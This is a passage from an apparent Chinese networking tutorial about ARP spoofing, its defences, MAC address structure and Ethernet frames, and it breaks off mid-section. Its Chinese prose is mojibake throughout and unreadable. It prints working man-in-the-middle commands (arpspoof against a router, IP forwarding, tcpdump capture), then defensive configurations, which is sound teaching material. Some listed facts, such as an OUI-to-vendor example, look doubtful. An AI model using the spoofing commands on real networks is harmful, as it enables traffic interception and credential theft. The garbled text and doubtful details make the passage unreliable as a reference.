ç»ˆç«¯2ï¼šæ¬ºéª—è·¯ç”±å™¨</span><br><span class="hljs-built_in">sudo</span> arpspoof -i eth0 -t 192.168.1.1 192.168.1.10<br><span class="hljs-comment"># å‘Šè¯‰è·¯ç”±å™¨ï¼šä¸»æœºAçš„MACæ˜¯æˆ‘çš„MAC</span><br><br><span class="hljs-comment"># ç»ˆç«¯3ï¼šå¯ç”¨IPè½¬å‘ï¼ˆä¿æŒè¿æ¥ï¼‰</span><br><span class="hljs-built_in">sudo</span> sysctl -w net.ipv4.ip_forward=1<br><br><span class="hljs-comment"># ç»ˆç«¯4ï¼šæŠ“åŒ…</span><br><span class="hljs-built_in">sudo</span> tcpdump -i eth0 -w capture.pcap<br><br>ç»“æœï¼š<br>ä¸»æœºAçš„æ‰€æœ‰æµé‡éƒ½è¢«æ‹¦æˆªï¼<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»å½±å“</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¯èƒ½çš„å±å®³ï¼š<br><br><span class="hljs-bullet">1.</span> çªƒå¬æµé‡<br><span class="hljs-bullet">   -</span> æ•è·ç”¨æˆ·åå¯†ç <br><span class="hljs-bullet">   -</span> çªƒå–æ•æ„Ÿä¿¡æ¯<br><span class="hljs-bullet">   -</span> ç›‘æ§é€šä¿¡å†…å®¹<br><br><span class="hljs-bullet">2.</span> ç¯¡æ”¹æµé‡<br><span class="hljs-bullet">   -</span> ä¿®æ”¹ç½‘é¡µå†…å®¹<br><span class="hljs-bullet">   -</span> æ³¨å…¥æ¶æ„ä»£ç <br><span class="hljs-bullet">   -</span> æ›¿æ¢ä¸‹è½½æ–‡ä»¶<br><br><span class="hljs-bullet">3.</span> ä¼šè¯åŠ«æŒ<br><span class="hljs-bullet">   -</span> çªƒå–Session Cookie<br><span class="hljs-bullet">   -</span> å†’å……ç”¨æˆ·èº«ä»½<br><span class="hljs-bullet">   -</span> éæ³•æ“ä½œ<br><br><span class="hljs-bullet">4.</span> æ‹’ç»æœåŠ¡<br><span class="hljs-bullet">   -</span> ä¸è½¬å‘æµé‡<br><span class="hljs-bullet">   -</span> å¯¼è‡´é€šä¿¡ä¸­æ–­<br><span class="hljs-bullet">   -</span> ç½‘ç»œç˜«ç—ª<br><br><span class="hljs-bullet">5.</span> DNSæ¬ºéª—<br><span class="hljs-bullet">   -</span> æ‹¦æˆªDNSæŸ¥è¯¢<br><span class="hljs-bullet">   -</span> è¿”å›ä¼ªé€ IP<br><span class="hljs-bullet">   -</span> é‡å®šå‘åˆ°é’“é±¼ç½‘ç«™<br></code></pre></td></tr></table></figure><h3 id="5-2-é˜²å¾¡æªæ–½"><a href="#5-2-é˜²å¾¡æªæ–½" class="headerlink" title="5.2 é˜²å¾¡æªæ–½"></a>5.2 é˜²å¾¡æªæ–½</h3><p><strong>æŠ€æœ¯é˜²å¾¡</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> é™æ€ARPç»‘å®š<br><span class="hljs-bullet">   -</span> æ‰‹åŠ¨é…ç½®ARPè¡¨<br><span class="hljs-bullet">   -</span> é˜²æ­¢è¢«è¦†ç›–<br><br>ä¼˜ç‚¹ï¼š<br>âœ… å®Œå…¨é˜²å¾¡ARPæ¬ºéª—<br><br>ç¼ºç‚¹ï¼š<br>âŒ ç®¡ç†å¤æ‚<br>âŒ éš¾ä»¥æ‰©å±•<br>âŒ éœ€è¦äººå·¥ç»´æŠ¤<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">-</span> å°å‹ç½‘ç»œ<br><span class="hljs-bullet">-</span> å…³é”®æœåŠ¡å™¨<br><span class="hljs-bullet">-</span> é«˜å®‰å…¨éœ€æ±‚<br><br>ç¤ºä¾‹ï¼š<br>sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-bullet">2.</span> åŠ¨æ€ARPæ£€æµ‹ï¼ˆDAIï¼‰<br><span class="hljs-bullet">   -</span> äº¤æ¢æœºåŠŸèƒ½<br><span class="hljs-bullet">   -</span> éªŒè¯ARPåŒ…çš„åˆæ³•æ€§<br><span class="hljs-bullet">   -</span> ä¸¢å¼ƒä¼ªé€ çš„ARPåŒ…<br><br>å·¥ä½œåŸç†ï¼š<br><span class="hljs-bullet">-</span> äº¤æ¢æœºç»´æŠ¤IP-MAC-ç«¯å£ç»‘å®šè¡¨<br><span class="hljs-bullet">-</span> æ£€æŸ¥ARPåŒ…æ˜¯å¦ä¸ç»‘å®šè¡¨ä¸€è‡´<br><span class="hljs-bullet">-</span> ä¸ä¸€è‡´çš„ARPåŒ…è¢«ä¸¢å¼ƒ<br><br>é…ç½®ï¼ˆCiscoï¼‰ï¼š<br>Switch(config)# ip arp inspection vlan 1<br>Switch(config)# interface GigabitEthernet0/1<br>Switch(config-if)# ip arp inspection trust<br><br><span class="hljs-bullet">3.</span> IPæºé˜²æŠ¤ï¼ˆIPSGï¼‰<br><span class="hljs-bullet">   -</span> åŸºäºIP-MAC-ç«¯å£ç»‘å®š<br><span class="hljs-bullet">   -</span> è¿‡æ»¤éæ³•IPåŒ…<br><br><span class="hljs-bullet">4.</span> DHCPä¾¦å¬ï¼ˆDHCP Snoopingï¼‰<br><span class="hljs-bullet">   -</span> å»ºç«‹IP-MACç»‘å®šæ•°æ®åº“<br><span class="hljs-bullet">   -</span> ä¸ºDAIæä¾›æ•°æ®<br><br><span class="hljs-bullet">5.</span> ç«¯å£å®‰å…¨<br><span class="hljs-bullet">   -</span> é™åˆ¶ç«¯å£å­¦ä¹ çš„MACæ•°é‡<br><span class="hljs-bullet">   -</span> é˜²æ­¢MACæ³›æ´ª<br><br><span class="hljs-bullet">6.</span> 802.1Xè®¤è¯<br><span class="hljs-bullet">   -</span> ç«¯å£çº§è®¤è¯<br><span class="hljs-bullet">   -</span> åªå…è®¸è®¤è¯è®¾å¤‡æ¥å…¥<br><br><span class="hljs-bullet">7.</span> VLANéš”ç¦»<br><span class="hljs-bullet">   -</span> åˆ†å‰²å¹¿æ’­åŸŸ<br><span class="hljs-bullet">   -</span> é™åˆ¶ARPæ¬ºéª—èŒƒå›´<br><br><span class="hljs-bullet">8.</span> ARPç›‘æ§å·¥å…·<br><span class="hljs-bullet">   -</span> ArpWatchï¼šç›‘æ§ARPå˜åŒ–<br><span class="hljs-bullet">   -</span> arpONï¼šä¸»åŠ¨é˜²å¾¡<br><span class="hljs-bullet">   -</span> XArpï¼šWindowså·¥å…·<br><br><span class="hljs-bullet">9.</span> ä½¿ç”¨åŠ å¯†åè®®<br><span class="hljs-bullet">   -</span> HTTPSä»£æ›¿HTTP<br><span class="hljs-bullet">   -</span> SSHä»£æ›¿Telnet<br><span class="hljs-bullet">   -</span> VPNéš§é“<br><span class="hljs-bullet">   -</span> å³ä½¿è¢«ä¸­é—´äººæ”»å‡»ï¼Œæ•°æ®ä¹Ÿæ˜¯åŠ å¯†çš„<br></code></pre></td></tr></table></figure><p><strong>ä¸»æœºç«¯é˜²å¾¡</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Linux:<br><br><span class="hljs-bullet">1.</span> å®‰è£…arpwatch<br>sudo apt-get install arpwatch<br>sudo systemctl start arpwatch<br><span class="hljs-section"># ç›‘æ§ARPå˜åŒ–ï¼Œå‘é€é‚®ä»¶è­¦å‘Š</span><br><br><span class="hljs-bullet">2.</span> é…ç½®é™æ€ARP<br><span class="hljs-section"># æ·»åŠ ç½‘å…³é™æ€ARP</span><br>sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-section"># æŒä¹…åŒ–é…ç½®ï¼ˆUbuntuï¼‰</span><br><span class="hljs-section"># ç¼–è¾‘ /etc/network/interfaces</span><br>up arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-bullet">3.</span> ä½¿ç”¨arptables<br>sudo arptables -A INPUT -s 192.168.1.1 --source-mac ! aa:bb:cc:dd:ee:ff -j DROP<br><span class="hljs-section"># åªæ¥å—æ¥è‡ªæ­£ç¡®MACçš„ARP</span><br><br>Windows:<br><br><span class="hljs-bullet">1.</span> é™æ€ARP<br>arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff<br><br><span class="hljs-bullet">2.</span> ä½¿ç”¨XArpè½¯ä»¶<br><span class="hljs-bullet">-</span> å›¾å½¢åŒ–å·¥å…·<br><span class="hljs-bullet">-</span> å®æ—¶ç›‘æ§<br><span class="hljs-bullet">-</span> è‡ªåŠ¨é˜²å¾¡<br><br><span class="hljs-bullet">3.</span> å¯ç”¨é˜²ç«å¢™<br><span class="hljs-bullet">-</span> é˜²æ­¢æœªæˆæƒè®¿é—®<br><br>macOS:<br><br><span class="hljs-bullet">1.</span> é™æ€ARP<br>sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff<br><br><span class="hljs-bullet">2.</span> ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·<br><span class="hljs-bullet">-</span> Little Snitch<br><span class="hljs-bullet">-</span> ArpGuard<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ç½‘ç»œç®¡ç†å‘˜ï¼š<br><span class="hljs-bullet">1.</span> éƒ¨ç½²äº¤æ¢æœºå®‰å…¨åŠŸèƒ½ï¼ˆDAI, IPSG, DHCP Snoopingï¼‰<br><span class="hljs-bullet">2.</span> ä½¿ç”¨VLANéš”ç¦»å…³é”®ç½‘ç»œ<br><span class="hljs-bullet">3.</span> å®šæœŸå®¡è®¡ç½‘ç»œè®¾å¤‡<br><span class="hljs-bullet">4.</span> ç›‘æ§å¼‚å¸¸ARPæµé‡<br><span class="hljs-bullet">5.</span> å®æ–½ç«¯å£å®‰å…¨ç­–ç•¥<br><span class="hljs-bullet">6.</span> å¯ç”¨802.1Xè®¤è¯<br><br>ç”¨æˆ·ï¼š<br><span class="hljs-bullet">1.</span> ä½¿ç”¨åŠ å¯†åè®®ï¼ˆHTTPS, SSH, VPNï¼‰<br><span class="hljs-bullet">2.</span> å®‰è£…ARPç›‘æ§å·¥å…·<br><span class="hljs-bullet">3.</span> å®šæœŸæ£€æŸ¥ARPç¼“å­˜<br><span class="hljs-bullet">4.</span> é¿å…åœ¨ä¸å®‰å…¨ç½‘ç»œï¼ˆå…¬å…±WiFiï¼‰ä¼ è¾“æ•æ„Ÿä¿¡æ¯<br><span class="hljs-bullet">5.</span> å…³é”®æœåŠ¡å™¨ä½¿ç”¨é™æ€ARP<br><span class="hljs-bullet">6.</span> åŠæ—¶æ›´æ–°ç³»ç»Ÿå’Œè½¯ä»¶<br><br>å¼€å‘è€…ï¼š<br><span class="hljs-bullet">1.</span> ä½¿ç”¨HTTPS<br><span class="hljs-bullet">2.</span> å®æ–½è¯ä¹¦éªŒè¯<br><span class="hljs-bullet">3.</span> ä½¿ç”¨HSTS<br><span class="hljs-bullet">4.</span> è­¦å‘Šç”¨æˆ·ä¸å®‰å…¨è¿æ¥<br><span class="hljs-bullet">5.</span> å®æ–½ç«¯åˆ°ç«¯åŠ å¯†<br></code></pre></td></tr></table></figure><hr><h2 id="6-MACåœ°å€å’Œä»¥å¤ªç½‘"><a href="#6-MACåœ°å€å’Œä»¥å¤ªç½‘" class="headerlink" title="6. MACåœ°å€å’Œä»¥å¤ªç½‘"></a>6. MACåœ°å€å’Œä»¥å¤ªç½‘</h2><h3 id="6-1-MACåœ°å€"><a href="#6-1-MACåœ°å€" class="headerlink" title="6.1 MACåœ°å€"></a>6.1 MACåœ°å€</h3><p><strong>MACåœ°å€æ ¼å¼</strong>ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext">MACåœ°å€ = Media Access Control Address<br>ç‰©ç†åœ°å€ã€ç¡¬ä»¶åœ°å€ã€ä»¥å¤ªç½‘åœ°å€<br><br>æ ¼å¼ï¼š48ä½ï¼ˆ6å­—èŠ‚ï¼‰<br>è¡¨ç¤ºï¼š12ä¸ªåå…­è¿›åˆ¶æ•°å­—<br><br>å¸¸è§æ ¼å¼ï¼š<br>aa:bb:cc:dd:ee:ff  (å†’å·åˆ†éš”)<br>aa-bb-cc-dd-ee-ff  (çŸ­æ¨ªçº¿åˆ†éš”)<br>aabb.ccdd.eeff     (Ciscoé£æ ¼)<br>aabbccddeeff       (è¿ç»­)<br><br>ç»“æ„ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   OUI (24ä½)     â”‚   NIC (24ä½)     â”‚<br>â”‚ ç»„ç»‡å”¯ä¸€æ ‡è¯†ç¬¦   â”‚  ç½‘å¡æ¥å£æ ‡è¯†    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç¤ºä¾‹ï¼š<br>00:1A:2B:3C:4D:5E<br><span class="hljs-attribute">â”‚ â”‚</span><br><span class="hljs-attribute">â”‚ â””â”€ ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æœ€ä½ä½</span><br><span class="hljs-attribute">â”‚    = 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">å•æ’­åœ°å€</span><br><span class="hljs-attribute">â”‚    = 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">å¤šæ’­åœ°å€</span><br><span class="hljs-attribute">â”‚</span><br><span class="hljs-attribute">â””â”€ ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¬¬äºŒä½ä½</span><br><span class="hljs-attribute">   = 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">å…¨çƒå”¯ä¸€ï¼ˆOUIåˆ†é…ï¼‰</span><br>   <span class="hljs-attribute">= 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">æœ¬åœ°ç®¡ç†</span><br><br>OUIï¼ˆOrganizationally Unique Identifierï¼‰ï¼š<br><span class="hljs-bullet">-</span> <span class="hljs-string">å‰3ä¸ªå­—èŠ‚</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IEEEåˆ†é…ç»™å‚å•†</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æ¯ä¸ªå‚å•†å”¯ä¸€</span><br><br>å¸¸è§OUIï¼š<br>00:1A:2B - Apple<br>00:50:56 - VMware<br>08:00:27 - Oracle VirtualBox<br>52:54:00 - QEMU/KVM<br><br>NICï¼ˆNetwork Interface Controllerï¼‰ï¼š<br><span class="hljs-bullet">-</span> <span class="hljs-string">å3ä¸ªå­—èŠ‚</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å‚å•†è‡ªè¡Œåˆ†é…</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">åŒä¸€å‚å•†å†…å”¯ä¸€</span><br><br>ç‰¹æ®ŠMACåœ°å€ï¼š<br><br>1. å¹¿æ’­åœ°å€<br>   FF:FF:FF:FF:FF:FF<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">å‘é€ç»™æ‰€æœ‰ä¸»æœº</span><br><br>2. å¤šæ’­åœ°å€<br>   01:00:5E:xx:xx:xx<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">IPv4å¤šæ’­æ˜ å°„</span><br><br>3. é›¶åœ°å€<br>   00:00:00:00:00:00<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">æ— æ•ˆåœ°å€</span><br></code></pre></td></tr></table></figure><p><strong>MACåœ°å€åˆ†ç±»</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å•æ’­MACï¼ˆUnicastï¼‰<br><span class="hljs-bullet">   -</span> ç¬¬ä¸€å­—èŠ‚æœ€ä½ä½ = 0<br><span class="hljs-bullet">   -</span> ä¸€å¯¹ä¸€é€šä¿¡<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š00:1A:2B:3C:4D:5E<br><br><span class="hljs-bullet">2.</span> å¤šæ’­MACï¼ˆMulticastï¼‰<br><span class="hljs-bullet">   -</span> ç¬¬ä¸€å­—èŠ‚æœ€ä½ä½ = 1<br><span class="hljs-bullet">   -</span> ä¸€å¯¹å¤šé€šä¿¡<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š01:00:5E:00:00:01<br><br><span class="hljs-bullet">3.</span> å¹¿æ’­MACï¼ˆBroadcastï¼‰<br><span class="hljs-bullet">   -</span> FF:FF:FF:FF:FF:FF<br><span class="hljs-bullet">   -</span> å‘é€ç»™æ‰€æœ‰ä¸»æœº<br><br>å…¨çƒå”¯ä¸€ vs æœ¬åœ°ç®¡ç†ï¼š<br><span class="hljs-bullet">-</span> å…¨çƒå”¯ä¸€ï¼šç¬¬ä¸€å­—èŠ‚ç¬¬äºŒä½ä½ = 0<br><span class="hljs-bullet">  -</span> IEEEåˆ†é…çš„OUI<br><span class="hljs-bullet">  -</span> ç†è®ºä¸Šå…¨çƒå”¯ä¸€<br><br><span class="hljs-bullet">-</span> æœ¬åœ°ç®¡ç†ï¼šç¬¬ä¸€å­—èŠ‚ç¬¬äºŒä½ä½ = 1<br><span class="hljs-bullet">  -</span> æœ¬åœ°é…ç½®<br><span class="hljs-bullet">  -</span> å¯èƒ½å†²çª<br></code></pre></td></tr></table></figure><h3 id="6-2-ä»¥å¤ªç½‘å¸§æ ¼å¼"><a href="#6-2-ä»¥å¤ªç½‘å¸§æ ¼å¼" class="headerlink" title="6.2 ä»¥å¤ªç½‘å¸§æ ¼å¼"></a>6.2 ä»¥å¤ªç½‘å¸§æ ¼å¼</h3><p><strong>ä»¥å¤ªç½‘IIå¸§æ ¼å¼</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä»¥å¤ªç½‘å¸§ï¼ˆEthernet Frameï¼‰<br><br>æ ¼å¼ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”<br>â”‚ å‰å¯¼ç   â”‚ ç›®æ ‡MAC â”‚ æºMACâ”‚  ç±»å‹   â”‚æ•°æ® â”‚ FCS â”‚<br>â”‚ 8å­—èŠ‚   â”‚ 6å­—èŠ‚   â”‚ 6å­—èŠ‚â”‚ 2å­—èŠ‚   â”‚46-  â”‚4å­—èŠ‚â”‚<br>â”‚         â”‚         â”‚      â”‚         â”‚1500 â”‚     â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜<br><br>è¯¦ç»†ç»“æ„ï¼š<br><br><span class="hljs-bullet">1.</span> å‰å¯¼ç ï¼ˆPreambleï¼‰ï¼š8å­—èŠ‚<br><span class="hljs-bullet">   -</span> 7å­—èŠ‚å‰å¯¼ç ï¼š10101010...<br><span class="hljs-bullet">   -</span> 1å­—èŠ‚å¸§èµ·å§‹å®šç•Œç¬¦ï¼ˆSFDï¼‰ï¼š10101011<br><span class="hljs-bullet">   -</span> ç”¨äºåŒæ­¥å’Œå¸§å®šç•Œ<br><br><span class="hljs-bullet">2.</span> ç›®æ ‡MACåœ°å€ï¼š6å­—èŠ‚<br><span class="hljs-bullet">   -</span> æ¥æ”¶æ–¹çš„MACåœ°å€<br><span class="hljs-bullet">   -</span> å¯ä»¥æ˜¯å•æ’­ã€å¤šæ’­ã€å¹¿æ’­<br><br><span class="hljs-bullet">3.</span> æºMACåœ°å€ï¼š6å­—èŠ‚<br><span class="hljs-bullet">   -</span> å‘é€æ–¹çš„MACåœ°å€<br><span class="hljs-bullet">   -</span> å¿…é¡»æ˜¯å•æ’­åœ°å€<br><br><span class="hljs-bullet">4.</span> ç±»å‹/é•¿åº¦å­—æ®µï¼š2å­—èŠ‚<br><span class="hljs-bullet">   -</span> â‰¥ 1536ï¼ˆ0x0600ï¼‰ï¼šç±»å‹å­—æ®µï¼ˆä»¥å¤ªç½‘IIï¼‰<br><span class="hljs-bullet">     -</span> 0x0800ï¼šIPv4<br><span class="hljs-bullet">     -</span> 0x0806ï¼šARP<br><span class="hljs-bullet">     -</span> 0x86DDï¼šIPv6<br><span class="hljs-bullet">   -</span> â‰¤ 1500ï¼šé•¿åº¦å­—æ®µï¼ˆIEEE 802.3ï¼‰<br><br><span class="hljs-bullet">5.</span> æ•°æ®å­—æ®µï¼š46-1500å­—èŠ‚<br><span class="hljs-bullet">   -</span> ä¸Šå±‚åè®®æ•°æ®<br><span class="hljs-bullet">   -</span> æœ€å°46å­—èŠ‚ï¼ˆä¸è¶³å¡«å……ï¼‰<br><span class="hljs-bullet">   -</span> æœ€å¤§1500å­—èŠ‚ï¼ˆMTUï¼‰<br><br><span class="hljs-bullet">6.</span> FCSï¼ˆå¸§æ ¡éªŒåºåˆ—ï¼‰ï¼š4å­—èŠ‚<br><span class="hljs-bullet">   -</span> CRC-32æ ¡éªŒ<br><span class="hljs-bullet">   -</span> æ£€æµ‹ä¼ è¾“é”™è¯¯<br><br>æ€»é•¿åº¦ï¼š<br>æœ€å°å¸§ï¼š64å­—èŠ‚ï¼ˆä¸å«å‰å¯¼ç ï¼‰<br>æœ€å¤§å¸§ï¼š1518å­—èŠ‚ï¼ˆä¸å«å‰å¯¼ç ï¼‰<br><br>MTUï¼ˆæœ€å¤§ä¼ è¾“å•å…ƒï¼‰ï¼š<br><span class="hljs-bullet">-</span> ä»¥å¤ªç½‘MTUï¼š1500å­—èŠ‚<br><span class="hljs-bullet">-</span> æ•°æ®å­—æ®µæœ€å¤§é•¿åº¦<br><span class="hljs-bullet">-</span> ä¸åŒ…æ‹¬ä»¥å¤ªç½‘å¤´éƒ¨å’ŒFCS<br></code></pre></td></tr></table></figure><p><strong>å¸§ç±»å‹</strong>ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs 